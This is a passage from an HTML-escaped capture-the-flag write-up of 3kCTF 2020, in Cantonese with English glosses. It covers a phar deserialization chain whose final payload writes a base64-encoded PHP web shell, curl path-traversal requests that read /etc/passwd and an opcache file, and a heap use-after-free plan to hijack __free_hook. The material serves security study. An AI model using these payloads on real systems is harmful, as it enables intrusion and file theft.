&lt;p&gt;Let&#39;s go back to &lt;code&gt;old.php&lt;/code&gt; and check our eyesight. The bottom &lt;code&gt;$data = &amp;quot;&amp;lt;?php...&lt;/code&gt; looks interesting but unless.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;除非個 &lt;code&gt;sprintf(&#39;%012d&#39;, $expire)&lt;/code&gt; 可以整走個 &lt;code&gt;exit()&lt;/code&gt; 啦.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Unless &lt;code&gt;sprintf(&#39;%012d&#39;, $expire)&lt;/code&gt; could be used to get rid of that &lt;code&gt;exit()&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;再碌上 D 見到個詭異嘅 variable function &lt;code&gt;return $serialize($data);&lt;/code&gt;. 咁開心.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Scroll up a bit then we can see a weird variable function &lt;code&gt;return $serialize($data);&lt;/code&gt;. So exciting.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;所以如果將 &lt;code&gt;$this-&amp;gt;options[&#39;serialize&#39;]&lt;/code&gt; 改做 &lt;code&gt;system&lt;/code&gt; 就可以行 &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;So if we set &lt;code&gt;$this-&amp;gt;options[&#39;serialize&#39;]&lt;/code&gt; to &lt;code&gt;system&lt;/code&gt; then we could run &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;但係個 &lt;code&gt;$data&lt;/code&gt; 要點砌呢. 根據所謂 POP 可以 trace 到:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;But how can we control &lt;code&gt;$data&lt;/code&gt;? According to the so-called Property-Oriented Programming, you can trace like this:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code&gt;$this-&amp;gt;options[&#39;serialize&#39;]($data) //cl2-&amp;gt;serialize&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;=&amp;gt; &lt;code&gt;$this-&amp;gt;serialize($value) //cl2-&amp;gt;set&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;=&amp;gt; &lt;code&gt;$this-&amp;gt;store-&amp;gt;set($this-&amp;gt;key, $this-&amp;gt;getForStorage(), $this-&amp;gt;expire); //cl1-&amp;gt;save&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;=&amp;gt; &lt;code&gt;return json_encode([$this-&amp;gt;cleanContents($this-&amp;gt;cache), $this-&amp;gt;complete]); //cl1-&amp;gt;getForStorage()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;首先個 &lt;code&gt;$data&lt;/code&gt; 有少少限制. 因為係 &lt;code&gt;json_encode&lt;/code&gt; 個 Array.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;First, the &lt;code&gt;$data&lt;/code&gt; is a bit restricted. Because it is constructed by &lt;code&gt;json_encode&lt;/code&gt;-ing an array.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;不過你想用 &lt;code&gt;system&lt;/code&gt; 行 command 其實可以好求其. 好似咩 &lt;code&gt;$(ls)&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;But if you just need to use &lt;code&gt;system&lt;/code&gt; to execute command, it is pretty flexible. Like using &lt;code&gt;$(ls)&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;最後可以砌到好似 &lt;code&gt;system(&#39;[&amp;quot;$(ls)&amp;quot;,0]&#39;)&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;At the end of the day we should be able to construct like &lt;code&gt;system(&#39;[&amp;quot;$(ls)&amp;quot;,0]&#39;)&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;要 trigger &lt;code&gt;cl1-&amp;gt;save&lt;/code&gt;, destructor 個 &lt;code&gt;$this-&amp;gt;autosave&lt;/code&gt; 要 false.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;If you want to trigger &lt;code&gt;cl1-&amp;gt;save&lt;/code&gt;, in the destructor, &lt;code&gt;$this-&amp;gt;autosave&lt;/code&gt; should be false.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;依家有齊啲餡啦. 要搵返 phar 個 payload.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;We are cooking with gas. Now we need to get the phar payload.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;邊鬼個會記得點寫. 抄返自己個威噏.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Who the heck will remember how to write the payload. Just copy my own write-up.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ozetta/ctf-challenges/wiki/Envy-(Tangerine&#34;&gt;https://github.com/ozetta/ctf-challenges/wiki/Envy-(Tangerine&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;由 &lt;code&gt;$p = new Phar(&#39;malware.phar&#39;);&lt;/code&gt; 果行抄起 (好似係)&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Copy the payload starting from &lt;code&gt;$p = new Phar(&#39;malware.phar&#39;);&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;上面記得抄返個 Class definition 同埋改晒 D property 佢.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Remember to copy the class definitions and change the properties to the desired one.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;個 &lt;code&gt;getimagesize&lt;/code&gt; 同 &lt;code&gt;image/jpeg&lt;/code&gt; 點算? 求其攝個 jpg 向頭咪得囉.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;How to tackle &lt;code&gt;getimagesize&lt;/code&gt; and &lt;code&gt;image/jpeg&lt;/code&gt;? Just inject a jpg file in front.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr&gt;

&lt;h2 id=&#34;final-payload&#34;&gt;Final payload&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

class cl1 {
    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store, $key = &amp;#39;flysystem&amp;#39;, $expire = null) {
        $this-&amp;gt;key = $key;
        $this-&amp;gt;store = $store;
        $this-&amp;gt;expire = $expire;
        //add your own properties
        $this-&amp;gt;cache = [&amp;#39;$(echo PD89YCRfR0VUWzBdYDs= | base64 -d &amp;gt; /var/www/html/up/z.php)&amp;#39;];
        $this-&amp;gt;autosave = 0;
        $this-&amp;gt;complete = 0;
    }
}

class cl2 {
    public function __construct(){
    	//add your own properties
    	$this-&amp;gt;options[&amp;#39;serialize&amp;#39;] = &amp;#34;system&amp;#34;;
    	$this-&amp;gt;writeTimes = 0;
     	$this-&amp;gt;options[&amp;#39;prefix&amp;#39;] = &amp;#39;&amp;#39;;
     	$this-&amp;gt;options[&amp;#39;data_compress&amp;#39;] = 0;
    }
}

$x = new cl1(new cl2(),&amp;#34;z&amp;#34;,0);
$p = new Phar(&amp;#39;malware.phar&amp;#39;);
$p-&amp;gt;startBuffering();
$p-&amp;gt;addFromString(&amp;#34;z&amp;#34;,&amp;#34;&amp;#34;);
$j = file_get_contents(&amp;#34;1.jpg&amp;#34;);
$p-&amp;gt;setStub($j.&amp;#34;&amp;lt;?php __HALT_COMPILER(); ? &amp;gt;&amp;#34;);
$p-&amp;gt;setMetadata($x);
$p-&amp;gt;stopBuffering();
$file = file(&amp;#39;malware.phar&amp;#39;);&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;

&lt;p&gt;之後 upload 個「圖」, 出返個 &amp;quot;filename.jpg&amp;quot;. 之後讀 &lt;code&gt;php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Then upload that &amp;quot;image&amp;quot;, will return &amp;quot;filename.jpg&amp;quot;. Then access &lt;code&gt;php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;之後點玩自己諗啦. 提示: 估下 &lt;code&gt;PD89YCRfR0VUWzBdYDs=&lt;/code&gt; 係咩先.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The rest is left as an exercise for the readers. (Hint: decode &lt;code&gt;PD89YCRfR0VUWzBdYDs=&lt;/code&gt;)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;remark&#34;&gt;Remark&lt;/h2&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-28-3kctf/image-uploader-troIl.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;&lt;del&gt;呢題咁易都搞咗我個半鐘真係失敗。&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-28-3kctf/image-uploader-trolI.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://twitter.com/confus3r/status/1286850105513930752&#34;&gt;https://twitter.com/confus3r/status/1286850105513930752&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;慘。早啲起身咪有 First Blood (好似係&lt;/p&gt;

&lt;h2 id=&#34;carthagods-web-496-points&#34;&gt;carthagods (Web; 496 points)&lt;/h2&gt;

&lt;p&gt;Author: rekter0, Dali&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Salute the carthagods!&lt;/p&gt;

&lt;p&gt;Hints&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rinlo/ctf-writeups/tree/master/2020/3kCTF-2020/carthagods/src&#34;&gt;redacted source&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;exploit&#34;&gt;Exploit&lt;/h3&gt;

&lt;p&gt;The challenge provided the redacted sourcecode as hints.&lt;/p&gt;

&lt;p&gt;.htaccess&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;...
RewriteRule ^([a-zA-Z0-9_-]+)$ index.php?*REDACTED*=$1 [QSA]&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;...
&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;$_GET[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;REDACTED&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;]){
    $file&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_GET[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;REDACTED&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;];
    $f&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;thecarthagods/&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$file);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;lt;\?php/i&amp;#34;&lt;/span&gt;, $f)){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $f;
    }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
      &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;php content detected&amp;#39;&lt;/span&gt;;
    }
  }
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The php script accepts user provided &lt;code&gt;$file&lt;/code&gt; path without any sanitation, however the GET parameter is redacted.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;.htaccess&lt;/code&gt; file rewrite the path to index.php with the GET parameter. Lets try the folder &lt;code&gt;thecarthagods&lt;/code&gt; as shown in the php file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl http://carthagods.3k.ctf.to:8039/thecarthagods&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We got the token&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &amp;#34;-//IETF//DTD HTML 2.0//EN&amp;#34;&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;301 Moved Permanently&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;Moved Permanently&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;The document has moved &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://carthagods.3k.ctf.to:8039/thecarthagods/?eba1b61134bf5818771b8c3203a16dc9=thecarthagods&amp;#34;&lt;/span&gt;&amp;gt;here&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;.&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;hr&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;address&lt;/span&gt;&amp;gt;Apache/2.4.29 (Ubuntu) Server at carthagods.3k.ctf.to Port 8039&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;address&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;With the token we can do path traversal&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd&amp;#34;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;However we cannot print the content of &lt;code&gt;flag.php&lt;/code&gt; directly&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../flag.php&amp;#34;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;textarea class=&amp;#34;label-input100&amp;#34; style=&amp;#34;color:black;width: 100%;height: 300px;&amp;#34;&amp;gt;php content detected             &amp;lt;/textarea&amp;gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;From the phpinfo provided we can know opcache is enabled, with &lt;code&gt;opcache.file_cache&lt;/code&gt; set to &lt;code&gt;/var/www/cache/&lt;/code&gt;. Maybe we can get the compiled version of &lt;code&gt;flag.php&lt;/code&gt; and get its content.&lt;/p&gt;

&lt;p&gt;The opcache will store the cache in the format &lt;code&gt;/var/www/cache/&amp;lt;system_id&amp;gt;/path/to/file.php.bin&lt;/code&gt;, with system ID generated from PHP version, Zend version etc. Therefore, I spin up a Ubuntu VM and install the same version of php, enable opcache to get the same system ID.&lt;/p&gt;

&lt;p&gt;The system ID is: &lt;code&gt;e2c6579e4df1d9e77e36d2f4ff8c92b3&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin&amp;#34;&lt;/span&gt; --output -&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;...
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;textarea&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;label-input100&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;color:black;width: 100%;height: 300px;&amp;#34;&lt;/span&gt;&amp;gt;OPCACHEe2c6579e4df1d9e77e36d2f4ff8c92b3�x��_Jqҍ@������������������������_���Ӛ��_/var/www/html/flag.php������/var/www/html/flag.php1����q��������d!=
VPyi0���Y�Į��{�opcache_get_statush���JK��&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;amp;&lt;/span&gt;3k{Hail_the3000_years_7hat_are_b3h1nd}`Lq�(��&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;iframe&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;width&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;560&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;height&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;315&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://www.youtube.com/embed/y8zZXMLBin4&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;frameborder&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allow&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allowfullscreen&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;iframe&lt;/span&gt;&amp;gt;֖|�flag                                          &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;textarea&lt;/span&gt;&amp;gt;
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;linker-pwn-493-points&#34;&gt;linker (Pwn; 493 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;cire meat pop&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;program&#34;&gt;Program&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;root@kali:~/3kctf/linker# ./linker
Welcome to your secret journal!
Provide name size:
8
Provide a name:
abcd
Welcome abcd
! What would you like to do?
1- Get new blank page
2- Edit page content
3- Empty a page
4- Relogin
5- Exit
&amp;gt; &lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This seems to be a heap challenge, which allow user to &lt;em&gt;create&lt;/em&gt;, &lt;em&gt;edit&lt;/em&gt; and &lt;em&gt;free&lt;/em&gt; a chunk. Also, it provides a weird function (i.e., &lt;em&gt;relogin&lt;/em&gt;) for changing the name which does nothing to the other functions, and usually means it will be used for later exploit.&lt;/p&gt;

&lt;h3 id=&#34;vulnerability&#34;&gt;Vulnerability&lt;/h3&gt;

&lt;p&gt;In &lt;code&gt;3- Empty a page&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Provide page index:&amp;#34;&lt;/span&gt;);
read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;4uLL&lt;/span&gt;);
idx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buf);
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; )
{
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong index kiddo...&amp;#34;&lt;/span&gt;);
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( check_pages[idx] )
{
  free(pages[idx]);
  check_pages[idx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// vuln
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;number_pages;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After freed a chunk, only the &lt;code&gt;check[idx]&lt;/code&gt; is set to 0; and in &lt;em&gt;Edit page content&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Provide page index:&amp;#34;&lt;/span&gt;);
read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;4uLL&lt;/span&gt;);
idx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buf);
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; )
{
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong index kiddo...&amp;#34;&lt;/span&gt;);
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( pages[idx] ) &lt;span style=&#34;color:#75715e&#34;&gt;// not checked
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;{
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Provide new page content:&amp;#34;&lt;/span&gt;);
  read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, pages[idx], (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)page_size[idx]);
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Edit function won&#39;t check &lt;code&gt;check[idx]&lt;/code&gt;, which means we can overwrite a free chunk.&lt;/p&gt;

&lt;h3 id=&#34;exploit-1&#34;&gt;Exploit&lt;/h3&gt;

&lt;p&gt;As we can overwrite any data into the free chunk, we can perform some attack to overwrite &lt;code&gt;__malloc_hook&lt;/code&gt; or &lt;code&gt;__free_hook&lt;/code&gt; with one gadget rce.&lt;/p&gt;

&lt;p&gt;However, we had two problems.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;tcache techniques won&#39;t work with calloc

&lt;ul&gt;
&lt;li&gt;Solution: We filled up tcache and perform fastbin attack.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Theres are no show functions to leak libc addresses

&lt;ul&gt;
&lt;li&gt;Solution: We utilize unsorted bin attack to write unsorted bin address to &lt;code&gt;name&lt;/code&gt;, then &lt;em&gt;relogin&lt;/em&gt; to print the content of &lt;code&gt;name&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;problem&#34;&gt;Problem&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;can&#39;t access tty; job control turned off&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Will this means we can&#39;t open the shell? Whatever, we change the approach from utilizing one gadget RCE to calling the &lt;code&gt;system&lt;/code&gt; function.
We can overwrite &lt;code&gt;__free_hook&lt;/code&gt; with &lt;code&gt;system&lt;/code&gt;, then free a chunk with content &lt;code&gt;/bin/cat flag&lt;/code&gt;, yielding &lt;code&gt;system(&amp;quot;/bin/cat flag&amp;quot;)&lt;/code&gt;. However, if we want control &lt;code&gt;__free_hook&lt;/code&gt;, we need to try harder.
